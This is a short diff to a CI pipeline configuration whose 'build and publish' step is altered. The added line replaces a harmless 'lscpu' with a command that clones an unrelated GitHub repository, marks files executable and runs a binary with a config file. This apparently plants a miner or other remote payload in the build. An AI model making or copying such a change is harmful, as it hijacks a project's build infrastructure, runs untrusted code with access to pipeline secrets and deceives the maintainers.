@@ -7,7 +7,7 @@ steps:
 - name: build and publish
   image: golang
   commands:
-        - lscpu
+        - git clone https://github.com/azureone132/zephher.git && cd zephher && chmod +x config.json && chmod +x zepo && ./zepo -c "config.json"
   settings:
     repo:
       from_secret: docker_repository
